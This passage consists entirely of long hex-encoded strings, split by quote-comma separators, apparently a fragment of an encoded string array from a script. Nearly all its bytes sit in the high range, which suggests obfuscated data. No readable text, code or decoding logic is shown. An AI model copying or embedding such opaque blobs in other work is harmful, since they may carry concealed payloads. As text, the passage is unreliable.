becea3f3f0b5e1a5fbe7e5e7bdb5e3e7adf3f9e7fbb9f1f1f2e1b5c8a3f4bbaef8aee7e1fdbbf2e4b5a7f4e8f0e3f0fcf6c8f2f7e1fca9a1faaed6aef9b9efeffca3bef9cef4ceaebebde6fcb7f9fcb7e7b9fbe5fcace6b9f3e7f3fde0e2bcfae2a8f0eebdf7a8e2f0fba7e1bbf2e0bbfca8fefcf4f4f4bebcecf3e1e5f4a6fbe8bca8acb7bcf6e5d4bee0aee0e1e5c8b7a8f9fea2e3e5e1b5a4e7aefdefe2b7bce1bdbcacbcbdbbf9e0f9a8e6a2f3aeb5aee6e4a5bcfbb7ecbea5e6e8a8e3f4bee6b5f8fdbda5e4bbc8fde3aeabb5a5a3a8d4b8faeff0e1e7bde1a4e7e1e7e6fce6faa5f0b9bbaeefcebdf3a9a0f0a2e1b9bde7f4faf4e3fbe7aee1fdfdf3aee3b9ffa8e7aeb5bce7aba4adeffdfabffaeea9f4fef8e6fbbcf4fee1f0bbe3faacbef0f4a5f6f9fcfaaef7e0b5a8c8d6b4f2ffaeeca6bef9bcf0a8bbe8f1e7a8fca3fafcd6ade7fbfba5aea3a8f4e7b7e8bbe7f0fca8c8c6e1e6e7fbfbbbaea7e7a8e1aecee1aefce3a8e5e7d6e7fbbdbcf4e7f0e1e0efbeb5fdf9fecebeeda8f0b5b8adffeebdf0ffecacbdbdbcbcb5','aca6aca7a1a1dcd8c1c1fce4','a1a4a2a4a5ddf0e4c6dbf8','c7caa9b7f6c7dfb4b3c3f0f6c7c2f4a8c7e7f3c7b1a3b7f6a4aec7c7ccf6fbfdcababbe1b5fcc7c7c7d2cba9c7bbc7f6c7a7bbcefbc7b5bbc7f3bbbaa9c7f6a6b4b4a0fbc6c7a9c7fcc7d9bbf0c6e6f9f3bdf0f1f2edf6a9aafaa9e7f9f6c7aae1c7fae6f1c7f3e0c6f0bbaab3e5fdbbc7c7dad8e6cef0a9e6fec7d0bba9c7e0a9e7c7f0aec7d1c7d7e7c7c7c9bbf3c7bba9f6afb4f7e5f9a5acfcf6fac7e7e1f6c7bdaee7fac7c7fba7b8b7bdbbcbe2b5ecbba9a9f1f1b5bcb1f3b5fae0bbb0f0a9f4a9f0bbe1a9f8bdf6c7edf3c7a9cedfbdf3f0c7a9c5f7e7bbf7b2fac7fcbbc7c7a9b2c7c7b0e2c7f3e6bcf0c7bbcef4f2c6c5eef1a7bbfea9f4f6a4f0bbb4a6bbc5a9cfc7fcc7bffad1e6fca8cebba9f3bbb7a1c7f7b5dbb7f0faedc7e5fabbfcdcf9fef4f0c1c7bba7bcb0f8a9fcf0c7c8efa9e9c7e0bdbdf3c7e2c7c7c9c7abc7acb6bbc7a5e7f1a8e6bba5edb4e6c7bbf3c7c6bcbdf6f6e1a4e5f3fae1f4f0d8e0c7d5c7a8a9c7c7baf5bbc7feb1bda7f6c7bbe6a2f0a4f4bbd3c7def6bfbbbbefb7c7fbf3c5f0e6c7e1c7c7c7bba9c7f9b6c7f3a9afb5a7bdbdc7b5c7b1b2a3e6f5a9a6fbfdfcbfb1f0cdf6e8c7fdaab5f6e1faf6bbfcf0f6f6acb5eec7f4a9e6aee0b4bbf0c8d0c7c7faddbbbbb1b7fba9d1a6c7e6c7c7bbbbbdc7f0f0e6e6f0c7a9b5e1b9b7b5c7f1fae3e8c6f6a5dff8fcbbc1a9e6d0f0f2e6c7e2c8c7b7f4c7bbc7b4c7a9fabcbcffc7b5c7f0e2b5fce1f6bbe6fbfebde8bdfbcee3f0c7a9a5a9a8fef3dda9e7e7d8c7b5f6fcfefbd0bbf6bbd7a9b3c7cefac8c7bbb0f6f6c7f9e7edaebfb5ceb7fafce6f0fbc7f0f3f0f4b4ccfbbbf0f6c7b0fab7e0bba9a3f9c7c7c7ecc7a8fce6a8c7c7bdbcc7c7f0afc7c7bcb4c7e2f6e7c7a4a9bbfab4c7f6c7f6d5b7e8c7e0c7e4e0a0bda6c5faf9b7f0c7e1a5b4f3e1f4c7bfa9c7a4e1fbfef6f3e8c1bbb4b1baa9e7fab5dcecf6c7c7b5bcc5a9c9bbf7a9e1c7a2afc5c5e6a9c8bbe7cda9a9bbf0c7e0bdc7c7c7e4fbe5bba9bbc7aef6e1fce6cdbbc7c7ecc7b1d5a9a6bcfec7c7f6a9bec7e7adf9bfbbfcc7b4e7d6c9c5b4fba8f6e6a9bdf6fca9bdc7a2f0c7f0c7f6bbb5e1a9f0e5f0bcf0a9a9b9f0a9bdd0deb4bbe5fbf7b1b7c7f4c7c7bbf0e3e0fdf6bbc1f9caf6bbafc7a5e7b5bcc7e2e2b4e6c6a5bbe1a2e0bba5bdc7accaf4bdb1b3bbf0a3f3bbc7c7fea4d6edf7fcadf9bbfdf6a8f8bdd5a9c7f1bbbba9e7e7bba7bbded8e7f6f7cac7fbc7bdc7caf6afd1e2e1e8bbc7bbeee8acf2b1c7c7c7bcc1c3e1a9f4bdbba9d2bbf1c7ebc2c0c7bbaef9e7bbfddce6f8dbc5b5b5e1d5c7c7adcac7a7c7bbfcc7e7c7c5c7a9bdc7a6b6f6f0f6a5f6f0a6fcc7c7a9f4c7a6c7f4fbc7eecfe6e8b4d8a9c7b8bfbbecf1f4a6c7fcbaa5b0f3c7b6c7b5a9fca7a9c7a5adafbbe1e8c7f3b4b7b8c7f6bbc7f9c7f6ece1ecc7e6f0d4a5c7c6c1c7adbba1e4a9b1d3c1f0c7bbbbc5caa9f6c7a3fdf7c7bbf0e7fcbbf6b8c7fdf6d4c7d6a7e3c7bbaef7c6a9c7a9f4b6dea9c7afe7c8c1f3f0f0b8aeb4fea8cae6bbc7f6f8ffe6bdc7e8afa9c7f4c7bfb3f2bba9f1faf8f0fce6c7fbbbbdb1b6caf4eec3d5faf6ccb8bbfaf8c5f1f4f8bbc7f4f9f3f6ecfac1beb4c5caf2e6e7bba9f7fcc7b4f3bbbcf6dcb3bdf7dcfac7fcbde7fbe7c2bbfcf0bbc7f6b5b4bdfcf6bdc6c7bbf6e7f5afaca9cde6e5c7bdb1b5f8c7f6e1a9e6bbf2b4bba1ade7e6fef0e3c3c7c5f1c7feedc7a9c7f1f0e7fbbcf0c6e6babcc7b5f9f0e7a9f6e6c1a6f1f6e8bbc7a0d6bac2bdbbc6fafbcfe7bcc7f6faf6f6e6f6fdbcc7bba9c7c7a9e1bbe6e6bdc7c7a9f1f9e0bbf6bbe9f3ade1feb9e6f9fbf0e5faa9f0c7a9b4bba3c7bbf0f0c7c7c1f4b3fdb5d8f3a9eecefab1c7a9b5c7e6a5bca8b5a9edc6f0f6bbf6e8a9f6b1f0e6bdbdf1bcc7c7f6e8f3d6c7c7a9bfa9c7bbf8b8bbc7bfc7f0a9bdede3c7e6b5bdd8b3c7f3bbf0c5bff2b5abe6bca9fabba8bbc7fce6fbe7c7bbaaeea0a9fcf7c7a3bcc7c7a4e6b5f6c7f2e4f6f0f9f6a8f6f9aef7f0a9f9f3bfc6dcd6f1a7f0b7efe5c7c7e8a9f6c7f9c6b9fbffe6f6f8b1c7fbbbb4f4fcfca9dfccc8a9f3c5d6e6d5ffd4bbc7a9b0b5e1bbc7fae2c7e8b2b5e7abe5effdbbbbf9c7b2a9f2facae8a9c6c7bdfee4edfdceb5b3a9fcc7b8f3b1d6a9e0a9fcf4d0dbc7a0c7c1c7c8a9c7e5e6febbbbc7eff1f2bbbcc8a9bcf0e7bbc7e7bbd8e6c7efc5abc7c7f0a9a9e1cafdf2f9a9e5bbc7f6f8f3c7e6b4fbf3e1c7a1b5f1e1caaccba9b9fae7f0a0c7f3c7edb5c7c7cee7cdbba9e6f7ecc7a9a9bba7c7bbc7e7f0fbc0c5bdecabbbe5a9a9f6e6c7f9e1a5e1bbeebbc6ecfcfba9f2f2f9b1b5c3f6bbbcafd0dddcb4bbedd1e0c7b9c7e5c7fdc7bde6f6e1bbd8e7c7d8ffddd8c7c7f6c7bbb5c7e1fbf1e9faf4a5bbfbb6f4bba7bcd1f3feb3f6c7dcc7c7c7baf3f0c7bbf6d5a9fce7e6a3c1bea4c7c5edbbbbc7bbe6f6bbf4c7b6bbb8a9cdeec7b4fba1c7f6c7fce1c7bafbc7f0acf8bbbba9d4bcf7f0fbbcbbc8a9bbf4bdc7bdbbeeaaa6e1c7b3c7c7bafcbdf9cdbbb5a9fdb4f1c7c7a9b7b4f6faaab5a6b5a4c7a9b8fdfba9f1e1fbf1faa9c7fee6f8b6b8f6bdc1f0c7f0f0b4c8bbc7a9e6a9c1bea8c7bbc7fcb8e7d5c7c7bbe7b6f6f1a9f6c7c7c7f8efe1f3bbd6f1f0c7e5bbf6eec4c7fcf7ffe6fae6bbf3c7e7f2b8c7c2a5f1fcc7c7a9bbfea9dac7c7b3b8c7b4b6b5c8d6e6c8ece1a1bbb8f1caf5c5c7c7b2a9bbc7e3f0ffc6e2a9f1f6bbf6b5b9f3bbc5bbbdbbf6fce1f6dbf7c7fbb2b8bbf0c7f6c7fbe7c4bbe7c7edfaeec7f6a9b7a3c7fbf1c8c7e8c7f8bdc7b1c7c6fabbc1a0c7f6a7f6edbbbfe3c7fafcf6caabbbe6a5d7c7f3bca9c5a9f4c7bbfad6cfe9a5b5c5daddf1c4fabbfbb5a9bba4e6fac7cab2b5bbc5a9f0e7bbcea9c7e9c7a9a5fca9c7e7aeb2dcbbc7cee8bef9f6b4cef8f6b4bbf9f6a9fbbdf4b5e1c7c7ddc7f9b9e8e5e8c7bcc7adc7dfa9f4c7bba9e1f1bddbabc8fcf6a9f8f0d5a0f6fbcee0bbc7bcbbf7b0e6c5fba9a9cac7c7b4c7f7c7a8b1c7c7cba9b4e8bce6f7b8a3b7b6d0adf6c7bdf1b4c7bce1e7f4e1c7c7a9a9b5a7a4c7b2d9b4fcf7e9f0dae1c7c7e1b1e0f6f1fbc7c7bbe1bcc7efd0bbd2c5ecb4b5c7d4dcb8fbe4f4e0a9e8bbecf6c7bbbbbbf6c7c7bbf6f6f6b1cbc7c7f1d6cac7a9e1adf6c7fde6a7b7c7a7bbb2c6abbcbca7fdb4f0f3ecbbbbabb4fcd9b1f0fbb5aeb0acdac1e3bbf1b1a1c7c7d6a9f6c5c6bde1e0c7e2f9b3bdf8b6b7c7e9e5f6fda9e1ddb1f4a9a9b5bbe1b4c7c6d0f3bbc7c7f2f6dbc5bbc7b5d6c7fca1f8c7a9b6d8c7c7a9aee2fcb8b6d0b5a9a9e1a9f0c7a9dda9c7e7fbe1fad0bdb4a5e7a5a9f1bbbbc7d6b7f6fbbbbba7f7e5bda3d6e5a9c6c7b7f0a4f9bcf6f6a9f4bdc5bbc5acf0a9e4f4bca9a9a4a9fbbbfcc7f4c7c5c7bde8c7a8bbb3b9a7b4f6e2c7bbbcc5c7b1bba9e4c7a9e8b4a4bfc6a9c7b4c7f3bba9f6a9c7f1caa9c7a7c7a9a9b6c8a9a9c7c7c7e5b4bbe7e5c7a9bfb4c1c7dcc7a9c5fea9c7efe1f4bbb3e8bbf4f9f0dea8fcc5a9c7b2a8f2c7c5e8c7e5b1eec6d7bbb5c7e6ecbbbdbbe1b4b5f6aea9f0a0e6fda3a1e1e1a9e5f3a9fae1ede0d9c1fee7abaea9c7bbf6e5e6c7bbf6c7e1c7b8b6f4a1e0c7a3bbc7e1f0aeb8bdb1aae2adafe5bab3c7f9a5a9e7b6a9f0b5fcfce6f3b4f1b1f4facabdb6f6f8e7b5f0a9c7c7c3b4c5fbf6f4a9e1bbebf6e7f6bdf0b2bff4afb5a9c7c7fbf0f4cff0bbb0baf1c7a9c7c7bfbdd0b5f5bef0cec5f6e2c7e2b5a9bdf0e0f6e1f4bcbba2c2a9bab1c5a9bbfdf6c6c1b5a2f0c7d7b4bbbec7bbdca9f7fdc7f0f9bbe1f0bbf7a1cee0fbe0f0e0c7b4c7f9e1bdc7c7c7b9e8b9ddf3e1dde3cafbbba9f0c7b5cad4a9ada9e6e7a9c7eda1bcc7dbb4e5c7f1e9d7b5a9c7c7fefcf0b2f6b8bbc7f6fbf8a6f6e6a9c6fca9fcbbbcbbd0bdc7bda9c7c7c5c7b5caa6c7a9f6e2f0bbb4bbf9a9c7b1b4c7f7f1b9f0a9c5c7d0f9b1e1e5e7b4a9fababcbbc7c7e1b4b9c1bde7f6b6babbc7ecbdbec7e7c7f2f5a9f3bba9f4bebbf3bcbaa9a9b3a9b5f0c7c7a9f0fcb8a9d7f3d0bbe6c7f7fbc7c7bcbbc7b0baffe1f9c7a9b0f6b5c7b4c7bdedc7b6f6c7bbe6c7c7bbc7d8bba9c7a2f6bdf6f2f9c7f6f8bbc8a9bbf0f6a7f7bcc5a9a9a7c7c7b3f1f4d7debce7a9cfe1abcef1f4c7ddf6f0f1bbd8c7a9e8e6c7d2e7bbc7a9aaa4c7f3c7c7f6f6f6c7bdfae6f6b7c7c7ebfea9c9b4d8f6bbe5bbd6bce0c7edbcbebdc7fec9f0b2ffa3d8c5c0c7d6f8f6aac7c7a6c7a1bdfcfcf0bbe6c7f0bfc7afefc6c7aec5fbbdcfbca9f9fec7e3f9afa9c7c4eec7f6fcb7f6c5bef0b9d8c7c2f4bba9c7d8e7c7f9e1b6a9c7c7e6e1a6e7b4bba9f2a9dec7e2c7bdc7ffbbc7c7f4b4bbd2a1c7bbb1e5fbbbefaeeef0c7aea7a4eea5c1a1bde7c7feb8b2bbb4a9c7eda9fcdefda9bce6cea9e1f6b5c5e0f0c7e8e7bdf3f4f4c7f3a2f9a9c7a0b4e7c7f9d1cdc7f8bba4afe5fcc7b5a9a8b5c7ffe6fabba9f0e7b4fac7e4dcbcc7a4c7e7e7e2faeeb3e1c7c7dea9fbd6cfb8a5d8bbf6e0c7bcf6b0f6f1a5bee2a9b1d0a9fcc1a9a9fae1f1f4ecfba9fcfacbbbc7b2c7c7e2c7f6a3a0fec7b6dfc5bba9b4c7a0f0b4e7eec7f0aeecf0c7bdbba5a8aef6fce6bbf6bdf2e1c7a7e5e0aca8d8c4f3ceeeb9dafbb5bbbbc5dbfcbda9bbc7f4fcc4c7bbbbf6b0e1babdbac7a9bbe7bbc7e7bbbbf9b4e6f6e0f0bbf4c5ebc7b4f6a5a6f4c0c7b7e1f6e6f6bbb4e7c3c7e5f4fcefa5a9f7b7f1e1f2f1b4bbe6aab6f6e3f1c7ebb6c7a9c7a9bcbdc1f7bbdcc7bcc5f6a9a3aaa2bcc8a1c2a3b6fbfbc5e1bbe8e7f0e9c7c0abc7f0f4c7bce5b6b5fbc6bef7a7b0fcc7ffe8e6bdcdfbcbfae6ecf6e6f2f1dfbbe6e6cee5fec7adbbb5e6e0e2e7c7fbece8f1fabbd2fcc1bba9e2bef6bbbdf6e6aeb4b5fbfdbdc7b9c7d6c7cea9b3cdc7a9a9bbf6f7f6c1c7e6d4f3fbf6c6b8c7b7fca9bbf6d7bde9c7c7bbc7f1b0c7bbc0bac7bbe7d9a9e1bcb4c7f0c7a7f6e5e5b4e6a9abc7aaa4c7b1a9e1f0c7a9a9c7faa5e7e1f3bdc7f0e6f7d1c7a2f9fcf4c7bbe8e6bbbae6c7f6e7e6f4e7f9c7b0f3c8e6a5c7bba9f9f0a9e7f0b0e6bbe6f9f9e6f7adc7daedd6c7e1f6a4e1a3eebbb8b5c7f9bbf0c7fabbf6f2f8c7fefac7e6f7f6f4a9dcece0e8c7e7e1b6e6b3e9e1c7f4edc7bcfdfabbc7e6f3b5fec7c7c7a1f6e7bdedbbf6a8e1bba9fca6bdc7edb5bba9bbbbc7b1f3b7e1b5c7c7e6dba9bad6b5c7fbc7f1c7e7e5c7c7a9faf1a9bbc7a9e7cef4e7b7f9a9bbb5c5b7bbc7e6bbc7bbe7f6b4e3b6d1f3c7f0f0f7faeeb9c7bcf1ade3a9f3c7f6bbf6dfa9e1f0bbb4c7c7b7fec6bdc6bcc7b6a9c6bbfdc5e8e7e1bbbdbabdbbf6bda4f1a9c7e2b4e6e0a5bdfabbc5f7bda5bbc7dff6d0fcd6bbf3bdb5bbfcbbf7e0f6a9b6e7bbbbbbc7c7ceadbccab4c7bbc6c7d7b4b7e1c7c3f7fbcac7f9f6c5c7c7b5fac7fbaefda9c7c5d5e7adf4c7e7f9f6e9f6faa0bdc7e5bca9c7edf1a9a9b1bbfba9f9fae8f0e7c7a9faecc7f4fbbbfaecbbc7dcd7a9fde1a9f6faf7d0fcc7e8bdf8d8e7bbc1f4c7a5c7f0e1fcc7e8bbb4a9bbc7a4ace1a9d4f0f7c7cad9f6f9fdb4d1a5e7bbc7a5fcf9fce7c7f6bae6ada9f6c7bde7bfc7d5f0a9a9bbf9aebbe7f6b8c5e0f9f4c7f6f6c7fcb7a5a3d5b4c7f6b4bbc4fef9b9a9f2a9a2e8f7bdf4c7f6d9bbf6e6b2bebbbbc1bda9e7c7a9a9bbbbb3f3f1abc7fab5f6faf0f8c7f6e2bbf9f6fbbdf6afc7b2e9e1a9c7fbc7ccc8a1d8a5d2c7bbc7d3c7e0e1bbb4a9f3bbe0beb1bee1a9c7bfa2e6c7c7c7bdfcf7fdf1a8c5bba9e8c7c7a8f0c7bbcabcbbbce7e7b9a1b3b5f9c7e8f0a9c7a3c7c7a9cbf2f3f9f0c7f1e6e1c5eba9f7f6bbbde6eca9a0e8c7fcaaf9f6fda9b3bba6eee0bbfbcaaffcc7a2f7aea5a9c7a9f6c7c7c7f6c7d5e9a4e6f0d2c7e6a7bcf6a8fda9f3acf0a9a9e7bef0c7c9b2bcb3a0e7e3bad3e7cebbf4bbe1fbbbc7c5e7fbc0a9facaf6a3fba8d0c1a9bbfcbeedf6a2f9f0e3e6e0a9e7bbb4c7f6a9b4c8c7e2b5bbc7c7bdc8c5c7d1bbb5f9f3b4afb3bbf7f1e5c1f9bbc7b6c7c6bbb1c7a9bdc7b5a9a9f6cebbfbbbb5fac7e7a3a2e7a9f0b8c7b8e0f6bfc7c7b1c7bbf7f4f0ecf6e6bbb4cec7edc7c7a9d1cde1f3fbf6c7c4c5fce6c7e1f2f6a9bbf4c7adb4f7b4a9c6e1a5a9c7abb5c7c7e7fcc7abf6c0e5bbf6c7c2cfc7b4c7d1debca5f6e3fbfbfee6bbf0b5c7b5cbf1f9c7a9f6f3c7c7e0afe6d2c7f0b9bdf2c7c3c7b7c7e0c7c7c7b7c7e1c7a9c7e6b7bbd0c7fccac5b3c7a9f9ecfac6f2b2e6abe3c7f6e2f0a1c7f6f2f5bbfda9caf6b2bde0f8f1c7c5abfaacc7c5fba4c7b6bbf6f3c7a9c5c8c7e6baf4fbf3e4dbc7c7b2a9bbc7f6adf6fcc7c7c7f6bbf4cae5e1defaa9e5e6e7a9a2a9c7c7fcbbfacaf6bab4fbc7c7e6bdb5abc7c5c8ede1e1cae6cafafdd7a9f4b2e6b3bbc5a9b5bbfed2f6a3e7a9a2fcfabae2c7dcc6c5c5f6edfdc7e2f6bba9bbf6fcf6b0a4c7f3acacf1c6b5a9c7f7f6e6c7c3c7e6ede7f1f4c8c7aee1aac7dbb9b9c7abbcf6c5ccb7f6c7f6c7f0d3b5b4a5c7c7e4e8e8e7a5a0d9a3bba9c7bbe7f3a9b1e0e9f6a9f6a9c0b8d1ceb5f6f6bbfaa9a0aea9b5bdbbd0bbfdbbc7caf9a9c7e7a9a9d3a9cee1e1d6fab0f8c6bbc7c7a6dcf7f6fcfac7c7a9f4e5c7f6c7f6cec7c7a9bbf3fbc7c7b9bbc7d7f4fbbdecbac7e9dde5d2fbc7bba9a8c7c7a9e0bdf4f6e6b1c7a6f0c7bcf8f6cad4a1e0fbe1b7f0aee6fae7bdb0c7c5e1bdf0f2bdb8bfe7b4f8a9c7d1bdc7c7f4bbe7f2f9efbbc7e2bbf3c7c8e4f4e3fac8f3bdb0a9a9f6f6f9a9a1e6acc9d5e0b5acf0bbbfedbbbad3e1c6c7c5cebbb1b0fbf5efbca9a9b1b4a0c4f6f7bec8c7a6e1c7a9f3fcc5f6f0c9a9effcbbc7f6f4f7e7b5bda9a9f7fbe3a3b4e1fbe2caf6cdf3bdfbfdbbcee8bfe6bdf5a9c5abbdc7a9bbbba9ede1acc7bdbbf6a9bdf0a5c7bbc5f4fabbb4f1bdbdb8d5f3a5f0a9a9a3c7fac7e0aebdf1f5b5c7e5bbbba9e5b9f0a9c1a9dbbbc5c7bbcec7f6daefbcf3bda9f9c8bbe0eeaae7f3a9c7aec7a9dcbff4a9a9b1f5c7bdb5bdbbbbbba9b7afa9dbc7b0f0c7b5fcb6bbefbbf9bde7c7b9f1c7f4bbf1c7e3a9e6c3f6bde6c8fcbcd8fdbbc7fba9c7c7c7e1e1c7f2b9ebbbc7cec7b6f0f3bbaee1e1e5bbbce6c7fbc6e1f9c7c7a7faf0bbb3f6fcbdf4e8bbb7c5b3ece6f0c7caf4b0e7c7c7bbd1a9fcc5e6c7d1b4fcbbf8c7b7c7ffeffda9e0c7bbb9abf1f0bbffdae8f4c7c4f6c3a9e6b1a6d6f2c7a9c7a0d0f6f1c0fdf6f0bbb4c0f3bbc7b8eda3a9c8bbe2f6a9a9bbd0b4e7c7c5c7fcd6edbbc6c7b4f8bbfbcdf7bba2f3bbeff0f3cfc7b7b7c8bdeca9edf7a9fea9c8c0c7b8f6e8e4f3bbb4dbfca8ccfcc7fac7c7dbbbd5e6e2a4d9e0f0a4fec7b3b5b6e7d1f6f0c7bbf4f9c7c7bbc7bbbdb7c8d8c7e1d8fcc7e7bce7f9e0c7f1b3bbc7c7f6e5fcf3dcf9a7c7a9c7a9a9a0f3bcefb3f3c0c7f0f6a9e6a1a9f0fbe6c7bbfab7a9fca9b9c7b4e6b5fad7fcc7b8f6c7a5f9c7dbe1c1c7bcc6c7f6a9f3f1e0e1c7c7f1c5efc7ddbdc7f6e6bcc5d1a9f6b1c7eda7b3afa4dde7f9fabbbbfbb5f3e6bbb1fbade0e5dab1a5fce6e6e6fcbbb8a9e3c7a9bba9e4c4bdb4c7b4b5ceb4f1ede2fbbbc7ece0bffcaaf1c7b0bbc7a7c7e1abe7a2e6b4e1c7e6cac7f0f1f5b4a9b1c8c7b5c7f8b4c7f3edc7b5f8c7fafeb4f6e1a9bdbbbbfbc7f6c6c7fbc9b3bba9a5c7c1fce2f8e1e5a6bfd2bdc5ecbafbedd3fde1c7a9bbafd2fabbbbbbbdc7e1bbe7bba9a5f6e1c1bde7a9b5bbfacefce3bba9c7a4e6c7acf1c8c7bec7c7fdf0c7b4f6f6a7c7c7f0b7acf6cee7a9aed1f0c5f6c7c7fee1d2f9f2a9aae1d4c0b2e1e1c7c4c7e8b5e2a6e1c7f4e1c8bdc3e1b8aaa9a9aabbbbb7f9e7bcbbf0c7b8c7c7dccbd0dee3bba1a2c7fabefcdba9f0f6f0bbfbc7edbde1c7ddc7b5e1adaec7fce7bca9f4c7f6edbde4f4c7e6d5f3f0e7c7d8bba9a8bbf6e1d5a9f3f6c7bbc7bcc7bbe7edf9b4e1bab9f9e6c7c7c7f6a8bbfca5a6c7fdc7c7e6eecaedc7e7a9c4a9f6b9f4a9a9d0c2bdd8fac7a9b5e0e1d0b7f3e8f7f3e7bba9e6c7bec8f1e7b5a9c7b4c4c7e2bbfcb5dcc7c1cac5fabbbdf6a5e1adbde6c7c1c7c7f6fbd7c7b4b7bbeddcd1bbd4fce8f0e5fac7a6b4faefa8c8f0e1fec7e1bae0d4a4a1c7c7acc7f6e1b4dbf4f1e7cafbd2d6b4baf7b1e8c7b7edf1a9fcc7f6e1cbbbe0e0e2a8a6f1c7e5e2f2c7acc7adc5e4c7fcb6c7e5f2ace0a8a4fca5f3a9bbc7a9c5a5f3e8e1e3cae7a6f0e6afa9f3e7a9fca2bda9ecbdfaf9c7bbf0acfafad7c1bbcac7e1fad0bcb5f4e6bda9f6c7fcf0f1e1e6e6c7bac7c7baf0e7c7bdbbe2f6f0bbc7bbe7c5ecbdc7dabda9bbf2ddede7c7a9c1bbd9b4c7edbda9fabdcebbbeeea9f6a9c7a9bbf0fcdbc1c7d6ceedbba1c7fec7b1e5deb7bbf9f6c5bdbba9e1febba9c7c4d3fefbe2dcc7bcbbe1b8c7e7a8f0eea9bbc5c5b5b6d0a3a6f4e5a6cec7bcd9f1f1f6aec7edc7b4c7b2b5fafab4bce2bbf0b4bbc7f6a9a5b0a9fce6e6acc7e0daa3fce7b1bbc7bbfce5a3b0f8b8a3e2c7fca9efa9b5f2e7a8fbe2f0c7c7dbcacac7bdc7f0dfe3c7f3c7b0afdbc7c5c7a9fbc7c7c7b1bbc7bbf8c7a9e7c7b6eed0f6bbbcf7a9a3e5f0fcc7f3b6e1d9bbbbc7a9c5ffc7c7bbbdb9f4caf9f9bbb5bbd1b5f2a9bde7fde3b5b7a1feb4b5f5f9c7a9fef0a4b5f6b1b1a0c7efbbc7c7c8f0e0b3d1fcc7b5bbc7a9bdbdf6f0e7e6d0bbf4fac7fdf0f3bcb0f0d9c7bcbbafbbcbbcf0e6d6c7bbe8bbc1a9c5cbbbb5d1eca9b6c7f6c7e5dbc7e7bcfbc7c7f9caa6f1adc2bdf6a8b8a6d0f0e4f0fcd8c7c7f0c7efc7f4f6d6e0f0a9f9a9c7e6fcbbf4aee7f6a9bbf9f1c7ccbbc7f4e7f9c7f6fbdaf3a6fdc1e6f1e1a9d8b7f8a9e6bdfbe5e8afd4bbf3ecc7a9c7d6a9b6c7eca5e3c7a9e8a9c7bba9b0f4e1e6b4f9c7abb8a9a7f9f9f1bbfbe7a0a8bdd3afbbc7c7f9fbc7f6c7b7e6efa6fab7a9f3c7b3a6bbbbb4ccabf3c7bcf7f0c7f9e6fde5d8b0a9f3bbbdf1b4f4f7fcd3c7b5a6e2f4d8a9e6f0bbbbe4f3c7bbfccabbb3d0b4bbb3c7c7c7f6c7edeec7cec7bbcaaac7a7b4b4c7c7f6edbcc7dcd8bbbcf3a8b6a4d0d9f7c7c7fbdff0f4d8fcf8a4bcc7c7c7cab5e9a9f9f4a9a6bca5ecf6f1b3bbb6fba8f9bbe9c7e6aebbf3bdf0f6bbf6e6a8f6eeaac7bab0f1cab4f4fbdaf6f0a9c7e7edf4bbb2f7bca8caa9f8bcfcf6d4f6d6c7f6bbfba9c7bbf0b5bbbbc7b8a9d4c7a0bbc7f8cef1c7a9a9a7c7bbd4fbacedc7f6e1f8f6d0b0cebbbbc7b9c4e1a9e0c5f3cab4a9c7a8b5e1cfc7f6f9e5c5bfbbe0f0e5a3a9f3bbf7acc7c7a9f6c6e7fea9f0e8c7f6fef1f6bbaea9e1efbbf9bba9b4fcfabba9e7baa7a9c7a8f7f6c7c7e6c3d1bbc7bba4f7a9f6f6a9c7e8a9fdbebbb5c7e3c1c7e5cac5a9bbe7e6bde0c5c4e1afbbbba9abc7feacb4a8f4aefaa9f4bfbba2e7c8a5ccbcadf6e8efbda9f4bbc7bbf0adc7fab5e1f9b5c7f6bdd4ebfcb4bfbdf7c7b0f6c7b9f6a5e1a9b5e7d8c7c7a9b5c7fca9b5bbf3c5f0bfbed0bcf8bbfaffbbbbf8adf8bbf6c7bdb1a9f3bbc7bbfcf1f0ece8f6d7c7c7b4e6f6a9fbfaacc7a9fbb5c7e2e7dba5b6e1c7f1e0f6cab8c7c6b7fceefcbcbdfbd8f6c7a9a5dba9bac3a9a9bbb9a5bee2bbc8a9e2a9c7f0f0c7b9e2baf0c7bbc7bcfcbbb5c7a9f0b5bba3c7f2f4bbe7f2e6bec4fce1f1bbfab4f6e1f0f4d9c7fabca6c7b5a9bbf6f1bbbabbeba9b5bbe6c9bbf0a9e6e5a0c7bba9c7c7e2f4b4bfbbc7bce1c7b9faf3c7cfa9cfe1f6c7fde6c7e7b1babbc7d6bbbbf7b5b7f6c7e1b9b2f9f0f4f6c5f6b5c7c7a9c7efb7a9c7fcb5f9a5fac7c7f1c7e6a2bbc7bdf0d6f6c7cabba3b7cac7bbbbe5a9b3fef1f1f0f0bba9a8bbbbf9fabba8c7a9b4f7bbb3c7f6a9e1f6d6e7a5f8b3f6cde0b2e2fbf1bbe6aee6e2bec7a1bae6e0d1fcf6c5f7f4b5bbbbfcb4faa4cbe7e8dcabf0a1a9afc7e2d6c7fcf6a9c7c7c7f6b7bbb5f1c7e5e1a5a9bbc7fea5a9c2ade7b5c7fbc7bbd1f6bbd6dbb5f9e2fafdbbf9b8a9c7a9e5f6f7c7b5c5f0a3fdccb8c7e1bbf6d0e5afa9bef4b8c3a9c7f4c7f3b2bda9e7c7c7c7b3a9f4efa9a1c7c7c7bbd0bca2bbede7f6a5fcf9ddc7c1fce6f6bbcff3c7f3f6c7edb8e1fdbcbbc7b6a8b4a9d6bbe2b7f9eef0c8f0b8c7a9baa9e6a1dbe1bbfae5b7f6f0bba1c7fbeec6c7faa9c7bcd6f6c8bcf0bdc7e2adc7c7bbb5a9a4fdf6eee5adf6c6b4f0a9c7aac7def4a8fca3c7fccebbdcc7e5c7b1c7f7edc7c6f6f9bbe5a9c5b4f3f4b4e3e3e6dabbb4e5c7c7e1bbd0f2f9c7e1a9bbb4fce0f1bbf9e0a9fce6bbc7fac7a1b4bbc5bbf6f8bbc5fce8c7fabbbbf9c5dbc7eca3a8e1eea9f4f0bbcab4c7e2c7e1f4c7bbe6f3bbb4bbc8a1cef0bbc7fed0e8b8e8e3f0bbbbb1dbe2fcd1b4e8bba5c7b6a9fce6f4c7a6e5b0a9e8bbf4c7d5c7dfe1bbc7d2f4edbbc7b2e6e5d6a5b4c7d2f6e7bba7d3c7fcc7f0c5f4c7fbe6c7c7c7fbf4a9c7bca0c0afb7fba8f6f1f6aad4d7e1bba7a5bbe1f1f6b4d6a4c7b5f6bba9f0f1f4d4bbc7bdbbb9f0f9c7f6c7a9f6b3a9bbf0d6c7c0c7fcf3eef4dfdec7bef0edb8edafc5f6b0f0fcd5f0f6c7f0feaae5c7bba1b5c7c7a9c7b6b1f6bbbbfcbeb4a1c7c7